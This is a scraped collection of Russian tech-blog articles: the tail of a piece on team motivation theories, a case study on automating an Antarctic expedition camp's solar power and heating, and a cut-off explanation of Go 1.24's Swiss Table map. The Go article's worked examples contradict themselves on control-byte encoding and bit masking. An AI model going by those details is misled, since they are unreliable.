требовалось признание его результатов. Был мидл, который мечтал о карьере.Но поскольку их желания никто не учитывал, люди теряли вовлечённость в работу, переставали развиваться и начинали задумываться об уходе. Качество и производительность падали. Ошибки в работе с мотивацией сказывались на результатах работы команды. Этот случай наглядно демонстрирует когнитивное искажение проекции — мы склонны приписывать другим собственные желания, амбиции, недостатки и действовать в соответствии с ними. Но этот подход вряд ли можно назвать эффективным. Особенно когда нужно обеспечить мотивацию и стимулировать нашу команду на достижение результата.Так что же делать? «Учиться, учиться и ещё раз учиться!» И разговаривать с людьми, чтобы лучше их понимать.Мотивация и стимулирование: в чём разницаМотивация и стимулирование в работе руководителя идут рука об руку, но между ними есть важные различия.Мотивация — это внутренняя потребность человека достигать целей, связанных с его ценностями, интересами и убеждениями. Именно внутренняя мотивация заставляет пилить пет-проект, играть на гитаре в свободное время и заниматься другими хобби.Но не всегда работа совпадает с внутренней мотивацией, поэтому её не хватает для достижения поставленных целей. В таком случае может работать внешняя мотивация или стимулирование.Допустим, человек ходит на работу ради денег. В таком случае потребность в деньгах — это внешняя мотивация. Она формируется под влиянием внешних факторов (удовлетворение потребностей требует денег), но со временем становится частью его системы ценностей: работа → деньги → удовлетворение потребностей.Стимулирование — это инструмент руководителя, который помогает активизировать сотрудника на действия в конкретном направлении. Это создание внешних условий, при которых человек будет замотивирован выполнять определённые задачи. Сюда относятся материальные и нематериальные вознаграждения, аттестации, рейтинги и подобное.Стимулирование — это мостик между существующей мотивацией человека и целями компании. Руководитель должен выявить существующую внутреннюю или внешнюю мотивацию, подобрать соответствующий стимул и связать его с ожидаемым результатом.Теории мотивацииСейчас будет немного теории, местами заземлённой на практику. Надеюсь, она поможет вам узнать что-то новое или же систематизировать и освежить уже имеющиеся знания.Люди — сложные, нелинейные и уникальные системы. Их поведенческие и мотивационные модели различаются даже внутри одной группы, а в разных социумах могут быть и вовсе противоположными. Тем не менее психологи попытались упорядочить этот хаос и создали теории мотивации, которые помогают оценить внутреннюю мотивацию сотрудников и подобрать подходящие стимулы.А поскольку психологи тоже люди, а значит, тоже уникальны, теорий получилось много. Я разберу несколько самых, на мой взгляд, интересных и применимых на практике. Если у вас есть желание дополнить список, не стесняйтесь оставлять комментарии!Теория ГерцбергаТеория Герцберга появилась в середине XX века. Согласно ей, на человека в рабочей среде влияют два типа факторов:гигиенические — факторы рабочего окружения. Их недостаток вызывает неудовлетворённость работой, но их значительное улучшение не приводит к росту вовлечённости и продуктивности;мотивирующие — факторы, отсутствие которых не снижает удовлетворение от работы, но их наличие значительно его повышает.ГигиеническиеМотивирующие— Административная политика компании— Условия труда— Величина заработной платы— Межличностные отношения с начальниками, коллегами, подчиненными— Достижения— Признание заслуг— Ответственность— Возможности для карьерного ростаГигиенические факторыОбратите внимание: величина заработной платы относится к гигиеническим факторам. Если её нет — люди просто не будут работать. Рост заработной платы до какого-то порога будет мотивировать и повышать производительность труда и лояльность, но с какой-то точки +10% к окладу уже не будут влиять на результат. Для удержания ключевых сотрудников гигиенические факторы могут очень хорошо работать. Если у человека зарплата выше рынка, отличные отношения с коллегами, великолепные условия труда — он привыкает к этому. Даже если само содержание работы ему не нравится, он, до определённого момента, продолжит работать, просто потому что уход означает потерю этих привилегий. Срабатывает эффект «золотой клетки». Но если условия начнут ухудшаться, сотрудник уйдёт очень быстро.Мотивирующие факторыПризнание заслуг. Наверняка кто-то помнит или видел в кино титул «Победитель соцсоревнования» или видел в McDonald's доску «Сотрудник месяца». Возможно, кому-то это покажется смешным, глупым, устаревшим, но это публичное признание, и это работает. Даже если в компании нет практики подобной мотивации, вы можете реализовать её внутри своей команды. Если же по каким-то причинам не хотите так делать, не стесняйтесь хотя бы публично благодарить людей за достигнутый результат. Это тоже будет признанием заслуг, а вы получите плюсик в карму как от самого сотрудника, так и от окружающих. Люди будут более активны и заинтересованы в дальнейшей работе.Рост ответственности — простой в применении, но важный мотивационный фактор. Например, опытного разработчика можно замотивировать, дав ему полномочия полностью определять архитектуру какого-либо модуля, сформировать задачи, проконтролировать их выполнение другими сотрудниками в рамках данного модуля. По сути, делегировать ему часть ответственности тимлида. Но важно помнить: этот метод работает не для всех.  Вы должны контролировать и обучать человека, которому вы делегировали ответственность.Возможности карьерного роста. Этот способ мотивации работает уже только на уровне компании. Как тимлид вы можете только помочь вашим сотрудникам расти, дать рекомендации, но результат будет зависеть от людей, отвечающих за организационную структуру бизнеса. Но этот вопрос решаем, хотя и с побочными эффектами. В части компаний можно встретить различные варианты лидов с реальными обязанностями, соответствующими ведущему разработчику. В более зрелых линейка позиций разработчика расширяется за счёт позиций типа Staff или Principal. Это позволяет не вносить путанницу и обеспечить долгосрочный карьерный рост. В некоторых компаниях расширяют линейку должностей за счет грейдов. Эти варианты расширяют возможности мотивации карьерой и лучше сказываются на климате в компании.С мотивирующими факторами в отличие от гигиенических можно работать гибче. Можно их использовать, чтобы добавить мотивации. Можно полностью от них отказаться: это снизит мотивацию, но люди от вас не уйдут. Важно при этом учитывать, что если вы уже что-то пообещали сотруднику в рамках мотивации, то лучше это сделать. Например, если было обещано повышение, человек работал ради него, а потом ситуация изменилась и возможность пропала, то вы потеряете доверие данного сотрудника, и он может даже уйти.Ну и повторюсь, все люди уникальны и влияние каждого мотивационного фактора на человека индивидуально. Чтобы применить правильные способы мотивации, вам нужно понять, чего человек хочет, готов ли он к этому, что нужно сделать, чтобы он был готов.Применение неверной мотивации может ухудшить отношения и привести к уходу сотрудника.Пирамида МаслоуПирамида Маслоу считается несколько устаревшей по сравнению с другими теориями мотивации. Со временем появлялись её более детализированные версии, а сама по себе она не дает чётких инструкций по мотивации сотрудников.Тем не менее она позволяет наглядно рассмотреть несколько важных моментов, о которых я хотел бы рассказать на основе личного опыта.Пирамида Маслоу у каждого своя. Она не всегда выглядит как классическая пирамида. Иногда она может выглядеть как песочные часы или иметь сложную форму.Люди разные. Объём потребностей у людей также разный. Например, у научных работников достаточно часто встречаются скромные физиологические потребности, но огромная жажда познания и признания. т.е. размеры блоков на картинке могут не соответствовать реальности.Когда какой-то уровень потребностей удовлетворяется, он имеет тенденцию разрастаться. Отличным примером является желудочный кадавр из книги «Понедельник начинается в субботу». Его создали с единственной потребностью — удовлетворение голода, и ожидали, что как только потребность будет удовлетворена, он будет счастлив, но, увы, в итоге он лопнул. Поэтому задача руководителя — не обеспечить абсолютное удовлетворение всех потребностей (это невозможно), а сделать так, чтобы их уровень был достаточным для выполнения текущих задач и не вызывал негативные эмоции у сотрудника.Если наложить теорию Герцберга на пирамиду Маслоу, то нижние уровни пирамиды можно считать гигиеническими факторами для более высоких. Это значит, что если нарушить базовые потребности, о мотивации более высокого порядка можно забыть. Поясню на примере токсичной коммуникации: например, человек знает, что за совершённую ошибку ему прилетит по голове, а руководитель будет вести себя неадекватно. Это негативно повлияет на уровень безопасности: сотрудник начнёт тратить очень много времени на перепроверку, чтобы не допустить ошибок. Это в свою очередь снизит его производительность. Если же руководитель перекладывает свои ошибки на подчинённых или просто ведёт себя неадекватно, это может полностью разрушить чувство защищенности, и сотрудник выберет уволиться.Кстати, ранее в контексте теории Герцберга я говорил о признании достижений как о мотивирующем факторе. Важный момент: публично ругать за ошибки, наоборот, нельзя. Это будет удар по уровню безопасности в пирамиде Маслоу и вызовет негативную реакцию не только от объекта, которому адресован негатив, но и от окружающих. Мотивация достижения и мотивация избеганияЭто целая группа теорий мотивации, которые важно учитывать в своей работе. Они рассматривают различные виды целей, восприятия мира и так далее. Я рекомендую поискать материалы самостоятельно: можете начать с книги «Психология мотивации достижения» Тамары Гордеевой или со страницы в Википедии. Это очень интересный раздел мотивации, но, к сожалению, в рамках этой статьи нет возможности раскрыть его полностью.Базовая идея простая: у людей бывает мотивация либо к достижению какой-то цели, либо мотивация избегания неудач и дискомфорта. Если человеку, у которого преобладает мотивация к достижению, поставить цель и связать её с его личными стремлением, он свернёт горы и достигнет цели. В отличие от него, человек с мотивацией к избеганию будет двигаться к цели только тогда, когда он почувствует дискомфорт или осознает, какие проблемы могут возникнуть, если он не достигнет цели.На первый взгляд, мотивация достижения может быть более затратной, чем мотивация избегания. Для мотивации достижения нужно помимо цели ещё как-то увязать её с личными мотивами человека, дать бонус, иногда сама цель может служить бонусом, но далеко не всегда.Может показаться, что для мотивации избегания достаточно создать угрозу: «Не достигнешь цели — уволю» или «Не получим этот проект — прогорим», и человек пойдёт к цели. Но это не так. Из негативной ситуации на работе всегда больше одного выхода. Очень высокий шанс, что на волне избегания человек обновит резюме. Поэтому мотивацией избегания нужно пользоваться крайне осторожно.Теория усиления мотивации СкиннераТеория мотивации Скиннера основывается на том, что люди склонны повторять действия, которые приносят им положительный результат, и избегать тех, которые ведут к отрицательным последствиям. Эта теория тесно связана с предыдущей темой о достижении и избегании, но применяет эти принципы к более локальным и простым целям. Основная идея теории: если человек выполняет нужное действие, его следует поощрять, чтобы он стремился повторить это поведение. Если же человек совершает нежелательное действие, его следует наказывать, чтобы он избегал этого в будущем. Пример использования этого подхода вы могли видеть в третьем эпизоде 3 сезона «Теории Большого взрыва», волшебные слова для поиска: «Шелдон дрессирует Пенни».Системы поощрений в IT-компаниях распространены достаточно широко. Это могут быть премии за хорошую работу, бесплатные печеньки и кофе за посещение офиса и тому подобное. Наказаний в чистом виде я лично не встречал, но слышал, что где-то практикуются штрафы за опоздания. Наказания за неправильное поведение, на мой взгляд, полезно заменять конструктивной обратной связью, в которой объясняется, что от человека ожидается. Об этом я расскажу подробнее в статье о коммуникациях.ЗаключениеЭто далеко не полный список теорий мотивации, которые можно использовать, но на мой взгляд, они дают хорошую базу и легко применимы в работе. Возможно, я коснусь их в будущих статьях, но вы всегда можете поискать дополнительные материалы в интернете.Важно понимать, что эти теории — обобщённые шаблоны. Как я уже писал выше, люди уникальны, и слепое применение идей теории может привести к неожиданному результату. Общайтесь с людьми. Интересуйтесь их видением будущего и настоящего. К чему они стремятся, чего они хотят, кем себя видят в будущем, и не только в работе. Это позволит найти, что нужно этому конкретному человеку, чтобы быть максимально эффективным в вашей команде. И кстати, в общении с руководством не стесняйтесь также обсуждать, чего вы ждёте от работы, куда стремитесь, что было бы вам интересно. Часто карьерные цели сотрудника и цели компании можно совместить, и ваш руководитель также в этом заинтересован."
57,"Антарктида, солнечные панели и пингвины: как автоматизировали лагерь на краю света",Wiren Board,Оборудование для автоматизации и мониторинга,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-10,"В 2024 году герой нашей статьи Кирилл Усанов участвовал в Московской молодежной антарктической экспедиции — образовательном проекте, который проводит ГБУ «Лаборатория Путешествий». В этом проекте подростки не просто смотрят на пингвинов и лепят снежки. Они проходят серьезный предварительный отбор, учатся выживанию в суровых условиях, работе в команде, овладевают научными методами и отправляются в настоящую экспедицию, где применяют все это на практике.Кирилл провел почти месяц недалеко от станции Новолазаревская, рядом с оазисом Ширмахера. В составе команды было 13 человек: школьники, студенты колледжей и взрослые — повара, медик, техник (Кирилл) и руководитель. Восьмерым ребятам поручили сбор проб воды, воздуха и других природных материалов по заданиям научных институтов.Антарктида — это не просто минусовая температура. Это порывистый ветер до 30 м/с, круглосуточное солнце и полная автономия: если что-то сломается, «зайти в магазин за батарейками» не выйдет. Все оборудование должно было работать надежно, потреблять минимум энергии и быть простым в обслуживании.Мощность источников энергии была ограничена, особенно в пасмурные дни, поэтому потребление приходилось держать под жестким контролем. При снижении напряжения система автоматики отключала неприоритетные потребители, оставляя только критически важные, прежде всего, отопление.Жилой модуль представлял собой связку из четырех больших палаток, соединенных в единую конструкцию центральным коннектором. Внутри организовали все необходимое: две спальни (мужская и женская), кухня с инженерным отсеком и кают-компания, совмещенная с лабораторией. Размеры позволяли комфортно разместить команду, а также развести оборудование и рабочие зоны. Снаружи палатки закрепили длинными болтами, вмороженными в лед. Внутри прокинули электропроводку 24 В, смонтировали отопление и освещение.Задача Кирилла — сконструировать, смонтировать  и обслуживать всю инженерную инфраструктуру лагеря: электропитание от солнечных панелей и аккумуляторов, отопление дизельными обогревателями, освещение, автоматическое управление и мониторинг. Четыре жилых модуля, соединенных коннекторомДополнительные фотоЖилой модуль и солнечные батареиКрасивая природа АнтарктидыКрасивая природа АнтарктидыКрасивая природа АнтарктидыКрасивая природа АнтарктидыБыт, ветер и пингвиныРабота с контроллерами, реле и датчиками — это, конечно, важно. Но Антарктида постоянно напоминала, что находишься не в лаборатории, а на краю света.Ночевка под ветромОднажды утром разбудил хлопок ткани — потолок палатки сложился прямо на кровати. Ветер разгулялся до 25 м/с, а палатка, несмотря на растяжки, начала терять форму. Пришлось экстренно укреплять лагерь, забивая в лед огромные болты, чтобы не улететь вместе со станцией.Антарктида — как другая планетаОазис Ширмахера, куда выходили участники экспедиции, оказался вовсе не заснеженной пустыней. Это участок Антарктиды с минимальным количеством снега, где открываются скалы, камни и ледниковые озера. В этих условиях выживают лишь самые устойчивые формы жизни — мхи, лишайники и редкие птицы. Всё это, в сочетании с тишиной, резкими перепадами рельефа и инопланетным ландшафтом, вызывало ощущение, будто команда оказалась не на Земле, а на другой планете.Ледовая пещера и спелеология на выживаниеВо время перехода к шельфовому леднику пришлось пройти через ледяную пещеру. В узком проходе один из участников застрял — пришлось вытаскивать всем отрядом. А потом лезли дальше — 20 метров боком по ледяной щели. Кошки на ботинках очень пригодились.Пингвины только в зеркалеПингвинов в районе лагеря не было — их колонии находились далеко. Но прозвище «пингвины» всё равно прижилось: из-за круглосуточного солнца и очков у всех на лице осталась белая зона загара в форме маски. Так участники стали называть себя «очковыми пингвинами».Другие подробности о жизни в экспедиции можете узнать в разделе «Комсомолки». А сейчас позвольте перейти к техническому решению, которое обеспечило жизнедеятельность экспедиции.Антарктический поморникДополнительные фотоУчастники экспедицииЗавтракЖилой модуль и солнечные батареиЛедяная пещераУчастники антарктической экспедицииЧто выбрали?Для электроснабжения лагеря использовали напряжение 24 В постоянного тока. Почти все оборудование — от отопителей до зарядок телефонов — питалось напрямую от нее. Для научной аппаратуры, требующей напряжения 230 В переменного тока, использовали инвертор.Генерация и хранение энергииВ качестве основного источника энергии использовали шесть солнечных панелей по 580 Вт (1×2 м каждая), подключенных к гибридному инвертору MUST PH18-3024 PRO. Этот инвертор выдавал одновременно 24 VDC и 230 VAC и заряжал аккумуляторы.Энергию накапливали в четырех карбоновых аккумуляторах VRC 12B емкостью 200 А·ч каждый. Резервный генератор на 2 кВт взяли на случай затяжной облачности, но за всю экспедицию он так и не понадобился — полярный день и высокий уровень солнечной инсоляции обеспечили стабильную работу панелей.Для мониторинга состояния аккумуляторов применили модуль WB-MAI6, который измерял напряжение на их клеммах. Параметры сети 230 В отслеживали через WB-MAP3E.ОтоплениеКаждый из четырех модулей лагеря отапливался отдельным воздушным дизельным отопителем Планар 9ДМ-24. Эти устройства предназначены для обогрева кабины автомобилей, рассчитаны на электропитание 24 В для работы вентилятора и управляющей электроники. Управление отопителями реализовали через модули реле WB-MR6-LV, а текущую температуру отслеживали с помощью пяти Zigbee-датчиков (по одному на модуль и один уличный), подключенных к встроенному модулю в контроллере Wiren Board 8.Освещение и бытовая нагрузка, датчикиОсвещение сделали на светодиодных лентах, подключенных к диммерам WB-LED. Управление остальными электроприборами (вытяжка на кухне, розетки 24 В и т.д.) реализовали через WB-MR6-LV. Система безопасности включала датчик дыма с сухим контактом, напрямую подключенный к дискретному входу контроллера. Контроллер и софтЗа управление всей системой отвечал контроллер Wiren Board 8, на который дополнительно установили Sprut.Hub — в нем настроили всю логику автоматизации. В случае снижения напряжения на АКБ контроллер отключал неприоритетную нагрузку, оставляя питание только на критически важные узлы: отопление и освещение.Для сбора статистики и визуализации применили Home Assistant, установленный на том же контроллере. Через него вели сбор данных с реле, датчиков температуры, напряжения и прочих устройств. Это позволило как отслеживать состояние системы в реальном времени, так и анализировать историю.Щит управленияДополнительные фотоОн же в интерьере модуляЗаключениеАвтоматизированная система управления на базе Wiren Board обеспечила бесперебойную работу систем жизнеобеспечения Антарктической экспедиции. Контроллер управлял отоплением, освещением и всей бытовой нагрузкой, а логика автоматического отключения неприоритетных потребителей обеспечивала надежную работу даже при падении заряда аккумуляторов.Датчики температуры и дыма следили за ключевыми параметрами безопасности, а система мониторинга вела подробную статистику — это помогало оперативно реагировать на отклонения и оптимизировать энергопотребление в режиме реального времени.Проект стал наглядной демонстрацией того, как можно реализовать бесперебойное энергоснабжение в условиях полной изоляции от внешней инфраструктуры. Такой подход подходит не только для научных экспедиций, но и для полевых баз, автономных поселений, мобильных лабораторий и других объектов, где стабильность, энергоэффективность и прозрачность управления критичны.А что вы думаете о проекте? Пишите в комментариях."
58,Go 1.24: принципы работы и преимущества обновленной map,SimbirSoft,Лидер в разработке современных ИТ-решений на заказ,0,"Веб-разработка, Программное обеспечение, Мобильные технологии",2025-04-10,"В феврале 2025 года разработчики Go выпустили версию 1.24, в которой значительно улучшили производительность языка. Одно из ключевых изменений коснулось структуры map — встроенного типа данных, предназначенного для хранения и быстрого поиска значений по уникальному ключу. Новая реализация повысила эффективность работы map, оптимизировала использование памяти и ускорила операции поиска, вставки и удаления элементов. Привет, Хабр. Мы backend-разработчики SimbirSoft Павел и Алексей. В этой статье подробно разберём, как именно изменился механизм работы map и какие преимущества это даёт.Основа — Swiss TableВ версии Go 1.24 реализация встроенного типа map была полностью переработана на основе структуры данных под названием Swiss Table. Эта структура, изначально разработанная инженерами Google для библиотеки Abseil, является высокопроизводительной хеш-таблицей, спроектированной для эффективной работы с кэш-памятью и быстрого доступа к данным.  Проблемы предыдущей реализации mapРанее в Go для разрешения коллизий в хеш-таблицах использовался метод цепочек, при котором каждый бакет содержал указатель на связанный список элементов с одинаковым хеш-значением. Этот подход был рабочим, но не был лишён некоторых недостатков:Низкая локальность данных: элементы, связанные с одним и тем же хеш-значением, могли находиться в разных участках памяти, что приводило к частым промахам кэша и снижению производительности.Увеличение накладных расходов: использование указателей и связных списков увеличивало объём памяти, необходимый для хранения структуры данных.Ухудшение производительности: в случае большого числа коллизий возникало снижение производительности вследствие того, что приходилось последовательно проверять все элементы в цепочке элементов с одинаковым хеш-значением.Как Swiss Table решает эти проблемыSwiss Table использует несколько ключевых подходов, которые позволяют повысить производительность и разобраться со старыми проблемами.Рассмотрим ключевые особенности Swiss Table:Открытая адресация: вместо использования связных списков для разрешения коллизий, как в методе цепочек, Swiss Table применяет открытую адресацию. Это означает, что все элементы хранятся непосредственно в одном массиве, что улучшает локальность данных и эффективность кэширования. Следовательно, при доступе к элементам map повышается вероятность того, что необходимые данные уже находятся в кэше процессора, что в свою очередь ускоряет операции поиска и вставки и соответственно снижает количество промахов кэша.Линейное пробирование с улучшениями: при возникновении коллизий оно используется с определёнными оптимизациями, что позволяет эффективно находить свободные слоты для новых элементов и уменьшает вероятность кластеризации.Группировка по 8 слотов (Group): таблица разделена на группы, каждая из которых содержит 8 слотов для пар «ключ-значение». Такой подход позволяет одновременно проверять несколько элементов, используя SIMD-оптимизации.Метаданные для слотов и контрольные слова (Control Word): каждая группа сопровождается 64-битным контрольным словом, которое содержит информацию о состоянии слотов. Каждый байт этого слова представляет собой один слот и содержит информацию о его занятости (свободен, занят или удалён). Также в контрольном слове хранится часть хеш-значения ключа, что ускоряет фильтрацию неподходящих слотов при поиске.Чтобы облегчить дальнейшее восприятие описанных механизмов и структур, рассмотрим основные понятия, используемые в данной статье.Основные понятия и термины Swiss TableГруппа  Группа — это логическая единица внутри Swiss Table, состоящая из 8 слотов для хранения пар «ключ-значение». Группа организована таким образом, чтобы все элементы в группе находились рядом в памяти. Это важное улучшение по сравнению с традиционными подходами, так как такая структура повышает локальность данных. Когда элементы группы располагаются в одном участке памяти, процессор с большей вероятностью будет находить их в своём кэше при обращении, что значительно уменьшает количество промахов кэша. В результате, операции поиска и вставки становятся быстрее.Слоты внутри группы эффективно используют доступное пространство и минимизируют накладные расходы на управление памятью. В Swiss Table группы организуются таким образом, чтобы эффективно работать с современными архитектурами процессоров, используя SIMD-оптимизации, что позволяет ускорить обработку данных, обрабатывая сразу несколько элементов одновременно.SIMD-оптимизация  SIMD-оптимизация (Single Instruction, Multiple Data) — это метод ускорения вычислений, при котором одна инструкция процессора применяется сразу к нескольким данным одновременно. В контексте Swiss Table этот подход используется для ускоренного поиска внутри группы из 8 слотов: благодаря применению SIMD-регистров процессор может за одно действие сравнивать контрольные байты всех слотов с искомым значением, тем самым значительно сокращая время поиска ключа в хеш-таблице.Параллелизм на уровне данных: вместо последовательной обработки каждого элемента данных по отдельности, SIMD позволяет выполнять одну инструкцию одновременно на группе элементов. Например, если у вас есть массив чисел, вы можете суммировать несколько пар чисел за одну инструкцию, используя SIMD-регистры, содержащие несколько значений одновременно. Векторизация: данные группируются в векторные регистры фиксированного размера (например, 128, 256 или 512 бит). В таких регистрах могут размещаться несколько числовых значений (например, четыре 32-битных числа или восемь 16-битных чисел). Процесс преобразования стандартного кода для использования векторных инструкций называется векторизацией.Архитектурная поддержка: современные процессоры содержат специализированные векторные регистры и инструкции для работы по принципу SIMD. Эти инструкции позволяют выполнять операции над всеми элементами регистра одновременно.Контрольное слово (Control Word)  Контрольное слово (Control Word) — это 8 байтовая структура, которая отвечает за быстрый поиск элементов в Swiss Table. Каждому из 8 слотов в группе соответствует 1 байт в контрольном слове.  Структура контрольного байта (Control Byte)Каждый байт содержит два типа информации:1 бит (старший) — флаг занятости (Empty / Deleted / Used), который указывает текущее состояние слота:0b00000000 (0x00) → Слот пуст (Empty)0b1xxxxxxx (H2) → Слот занят (Used)0b10000000 (0x80) → Слот удалён (Deleted) также данное состояние называют Tombstone, по своей сути является маркером для алгоритма пробирования, далее будет более подробно раскрыт смысл данного статуса.7 бит (младшие) — нижние 7 бит из результата хеширования (H), в случае состояния Used.H1 и H2  Здесь мы впервые сталкиваемся с таким понятием, как H. Отметим, что ранее в статье мы не говорили про H1 для групп, однако H1 тесно связано с группой и фигурирует в алгоритме поиска, который рассмотрим отдельным пунктом более подробно. Сейчас же для базового понимания рассмотрим более простое определение.Допустим, у нас есть 64-битный хеш:H = 1101010100110110001010111001010110100111100000001100010110010001 в таком случае H1 (57 бит) → первые 57 бит, которые указывают на группуH1 = 110101010011011000101011100101011010011110000000110001011H2 (7 бит) → последние 7 бит, которые будут записаны в контрольное словоH2 = 0010001На данном этапе может возникнуть вопрос. А что же произойдёт в случае если H2 от хеш-функции будет равен H2 = 0000000? На данный случай распространяется специальное правило, если H2 будет равен 0, то вместо него в контрольное слово будет записано 0b0000001, это позволит избежать конфликта с пометкой контрольного байта в контрольном слове, как удалённого 0b10000000. Поскольку H2 это всё равно всего 7 бит, то вероятность, что такое изменение приведёт к коллизии, крайне мала, но таким образом гарантированно исключается случай с ложной пометкой состоянием Deleted.СлотСлот — это базовая ячейка хранения данных внутри Swiss Table. Каждый слот принадлежит определённой группе и включает в себя:Ключ (Key) хранит уникальный идентификатор элемента.Значение (Value) - данные, ассоциированные с ключом.Контрольный байт (Control Byte) — 1 байт в составе контрольного слова группы, указывающий на состояние слота. Важно, каждый слот не содержит физически контрольного байта внутри себя, но связан с ним через контрольное слово группы.Мы рассмотрели ключевые структуры и механизмы Swiss Table, которые лежат в основе новой реализации map в Go 1.24. Теперь рассмотрим, как они работают на практике: как происходит вставка, поиск и удаление элементов, а также каким образом таблица динамически растёт и перераспределяет данные.Принципы работы новой Map  Логика базовых операций MapПроцесс вставки нового элемента в Swiss Table состоит из нескольких этапов:Вычисление хеша ключа и разбиение на H1 и H2Сначала вычисляется 64-битный хеш от ключа. Далее он делится на 2 части, данный процесс мы подробно рассматривали в терминологии.  Определение начальной группыГруппа выбирается с помощью операции побитового И: Группа = H1 & (число_групп - 1) Это работает, поскольку количество групп — это степень двойки и побитовая маска выбирает младшие биты H1.  Допустим: H = 1101010100110110001010111001010110100111100000001100010110010001 (64 бита)  H1 = 110101010011011000101011100101011010011110000000110001011  Группа = H1 & (8 - 1) = H1 & 0b111  Группа = 011 (3 в десятичной)Поиск слота внутри группыКак упоминалось ранее Swiss Table организована так, что каждая группа содержит 8 слотов.Поиск начинается с чтения контрольного слова и сравнения всех 8 байт с H2.Если слот имеет статус Deleted (tombstone), алгоритм продолжает пробирование, игнорируя его, а обнаружение пустого слота (Empty) означает, что в этой группе больше нет элементов, и поиск можно завершить.Если найден байт с таким же H2, то запускается процесс полного сравнения переданного ключа, с найденным ключом.В случае успешного сравнения возвращается соответствующее ключу значение.В случае неуспеха, возвращается значение по умолчанию для хранимого типа.Для вставки элемента алгоритм поиска слота идентичен, но с некоторыми дополнениями:В случае успешного сравнения значение по соответствующему ключу переписывается на новое.Если найден слот в статусе Deleted (tombstone), алгоритм запоминает его как возможное место для вставки, но продолжает поиск, чтобы убедиться, что ключ отсутствует. Данный механизм пометки статусом Deleted служит для того, чтобы не прерывать цепочку пробирования. Если помечать удалённый слот, как Empty, то при поиске ключей алгоритм мог бы остановиться, решив, что дальше в цепочке нет элементов, и пропустить искомый элемент, который находится дальше в цепочке.Если найден слот в статусе Empty, то, если ранее был найден tombstone, используется tombstone — иначе элемент вставляется в найденный пустой слот.Допустим:🔵 Empty (0x00) = свободное место❌ Tombstone (0x80) = освободившийся слот, который нужно переиспользовать✅ Used = занятые слотыПоследний слот пустой, вставка произойдёт в седьмой слот.Третий слот содержит Tombstone, а седьмой слот пустой. В таком случае вставка произойдёт в третий слот с заглушкой.Линейное пробирование, если группа заполненаВ том случае, если на первом шаге, где была определена начальная группа по формуле, она оказалась заполнена, то алгоритм не будет пересчитывать маску. Вместо этого он будет двигаться к следующей группе линейно, пока не найдёт свободный слот. Этот процесс повторяется до первой найденной группы с хотя бы одним свободным слотом.Допустим:У нас 8 групп и H1 & 0b111 дал группу 5, но она уже заполнена:  1. Группа 5 заполнена → идём к группе 6.   2. Группа 6 заполнена → идём к группе 7. 3. Группа 7 свободная → записываем туда.В том случае, если заполнено слишком много слотов, а именно общий load factor таблицы превышает порог в 81,25%, то запускается расширение таблицы.Рост таблицыВместо резкого увеличения размера хеш-таблицы используется extendible hashing, который позволяет расширять таблицу постепенно. Этот метод снижает накладные расходы при росте таблицы и минимизирует перераспределение элементов.Директория (Directory)Директория — это структура, управляющая ссылками на группы хеш-таблицы.Директория минимизирует перераспределение элементов при расширении, используя механизм локальных и глобальных разделений (split и directory doubling). Она поддерживает масштабируемость структуры, позволяя таблице динамически расти без излишних накладных расходов.На начальных этапах, когда общее число групп не превышает 1024, директория напрямую указывает на отдельные группы, используя младшие биты хеша для быстрого доступа. Такой подход обеспечивает эффективное распределение элементов и минимальные накладные расходы.Однако, по мере роста таблицы, когда число групп превышает 1024, подход с монолитной таблицей становится неэффективным. В этот момент Swiss Table переходит к концепции подтаблиц. Вместо одной общей таблицы создаются независимые подтаблицы, каждая из которых содержит фиксированное число групп. Процесс адресации теперь разбивается на два этапа:Выбор подтаблицы: для этого используются старшие биты хеша, которые определяют, в какую подтаблицу попадет элемент.Выбор группы внутри подтаблицы: затем младшие биты используются для выбора конкретной группы в выбранной подтаблице.Такой подход позволяет Swiss Table динамически изменять глубину адресации и масштабироваться, минимизируя перераспределение элементов и накладные расходы.Увеличение таблицы при заполненииКак говорилось выше, существует 2 типа разделения:split — локальное разделение на уровне переполнения групп, при данном разделении будет заранее аллоцирована подгруппа B, но на неё не будет ссылок до момента наступления directory doubling.directory doubling — удвоение количества групп в таблице происходит при достижении общей загрузки таблицы (load factor) в 81,25%, при этом локально перегруженные группы уже заранее аллоцировали себе память на подгруппы B на этапе split и на данном этапе они получают полноценные ссылки в директории.Также существует особый случай расширения. При достижении 1024 групп, обычно это соответствует ~8192 элементам, таблица перестаёт быть монолитной. Вместо одной большой таблицы создаются независимые подтаблицы, каждая из которых продолжает расти отдельно.Механизм выбора группы:до 1024 групп: описан в разделе «Определение начальной группы»после 1024 групп:директория указывает не на отдельные группы, а на подтаблицы;старшие биты хеш-значения используются для выбора подтаблицы;младшие биты используются для выбора конкретной группы внутри выбранной подтаблицыДопустим:У нас есть 2048 групп (2 подтаблицы по 1024 группы каждая)Элемент с хешем: H1(A) = 0b011011001011011000101011100101011010011110000000110001011Первый бит 0b0 → указывает на первую подтаблицуПоскольку каждая подтаблица содержит 1024 группы (2¹⁰), для выбора группы внутри подтаблицы используются 10 следующих бит.Соответственно следующие 10 бит 0b1101100101→ указывают на группу внутри подтаблицы.Перемещение элементовЭлементы не просто копируются в новую таблицу, а перераспределяются в соответствии с новыми битами хеша. Например, если изначально использовалось N бит хеша для определения группы, то после расширения может использоваться N+1 бит. Это происходит потому, что при увеличении числа групп их количество удваивается, а значит, для их адресации требуется еще один дополнительный бит хеша.В случае, если хеш-таблица разделена на несколько подтаблиц, процесс выбора элемента проходит в два этапа: сначала с помощью старших бит хеша определяется, в какую подтаблицу попадет элемент, а затем младшие биты используются для выбора конкретной группы внутри выбранной подтаблицы.Например:у нас есть 8 групп, как в примерах ранее, и мы используем 3 бита хеша по маске для выбора группы. Пусть есть хеш значения для двух ключей:H1(A) = 0b011011001011011000101011100101011010011110000000110001011H1(B) = 0b111011001011011000101011100101011010011110000000110001011При текущем размере таблицы 8 групп используется 3 бита:A: H1(A) & 0b111 = 0b011 → Группа 3B: H1(B) & 0b111 = 0b011 → Группа 3При увеличении размера таблицы до 16 групп используется 4 бита:A: H1(A) & 0b1111 = 0b0011 → Группа 3 (остался)B: H1(B) & 0b1111 = 0b1011 → Группа 11 (переместился)На данном примере наглядно видно, что произошло разделение группы, а не полное перемещение всех элементов.Подведем итогПодытожим механизмы борьбы с коллизиями новой реализации map в Go 1.24, основанной на Swiss Table:Быстрое отсеивание позволяет отбрасывать неподходящие слоты без обращения к ключам.Полное сравнение ключей гарантирует корректное разрешение коллизий при совпадении H2.Использование tombstone позволяет сохранять непрерывность пробирования при удалении элементов.Линейное пробирование минимизирует количество перехеширований и равномерно 